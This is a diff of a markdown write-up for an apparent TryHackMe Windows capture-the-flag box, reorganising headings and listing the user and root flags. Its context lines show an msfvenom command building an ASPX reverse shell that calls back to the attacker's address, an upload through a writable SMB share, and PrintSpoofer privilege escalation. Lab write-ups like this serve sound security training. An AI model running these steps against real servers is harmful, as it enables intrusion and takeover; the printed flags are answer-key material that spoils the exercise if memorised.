@@ -358,6 +358,10 @@ Progress: 93463 / 220561 (42.38%)              [ERROR] 2022/10/01 21:21:35 [!] G
 
 What interesting here is that we can access `nt4wrksv` — directory we accessed previously via smb. Moreover, as we previously have seen, we can write to shared directory. So, we can upload a payload and run it with this port.
 
+***
+
+## <strong><font color="#34A5DA">Exploitation</font></strong>
+
 Create an aspx shell as it is windows webserver:
 ```
 vladislav@Mac ~ % msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.7.222 LPORT=5566 -f aspx -o payload.aspx
@@ -422,6 +426,12 @@ SeCreateGlobalPrivilege       Create global objects                     Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 ```
 
+***
+
+## <strong><font color="#34A5DA">Privilege Escalation</font></strong>
+
+
+
 Looking in the Internet for privileges we can find <a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a> for `SeImpersonatePrivilege` priv.
 
 Upload it with smb:
@@ -452,13 +462,9 @@ type root.txt
 THM{1fk5kf469devly1gl320zafgl345pv}
 ```
 
-***
+> User Flag `THM{fdk4ka34vk346ksxfr21tg789ktf45}`
 
-## <strong><font color="#34A5DA">Exploitation</font></strong>
+> Root Flag `THM{1fk5kf469devly1gl320zafgl345pv}`
 
 
-
-***
-
-## <strong><font color="#34A5DA">Privilege Escalation</font></strong>
 
